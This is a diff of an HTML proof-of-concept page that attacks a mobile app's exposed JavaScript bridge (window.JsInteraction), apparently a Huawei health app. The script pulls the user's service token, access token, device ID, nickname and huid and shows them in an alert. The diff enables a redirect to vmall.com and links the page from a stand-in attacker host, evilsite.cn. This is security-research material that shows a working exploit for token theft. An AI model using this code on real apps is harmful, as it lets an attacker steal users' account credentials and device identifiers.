@@ -4,11 +4,8 @@
 </head>
 <body>
 <script>
-  
-	alert("I got your DeviceId:\r\n" + window.JsInteraction.getDeviceId() + "\r\n\r\nServiceToken:\r\n" + window.JsInteraction.getServiceToken()+ "\r\n\r\nSportData:\r\n" + window.JsInteraction.getSportData());
-        
-//setTimeout('getinfo()',20);
-	getinfo();
+
+setTimeout('getinfo()',20);
 function getinfo() {
 var sertoken=window.JsInteraction.getServiceToken();
 var nickname=window.JsInteraction.getNickName();
@@ -20,7 +17,7 @@ var getAccessToken=window.JsInteraction.getAccessToken();
 var msg='ServiceToken:'+sertoken+'\r\nNickName:'+nickname+'\r\nhuid:'+huid+'\r\nEnvironment:'+getEnvironment+'\r\nDeviceType:'+getDeviceType+'\r\nDeviceId:'+getDeviceId+'\r\nAccessToken:'+getAccessToken;
 alert(msg);
 }
-//document.location.href="http://www.vmall.com";
+document.location.href="http://www.vmall.com";
 </script>
   <a href="http://www.evilsite.cn/vmall.com/hwhealth/remote_getdata_mainactivity_1.html">http://www.evilsite.cn/vmall.com/hwhealth/remote_getdata_mainactivity_1.html</a>
 </body>
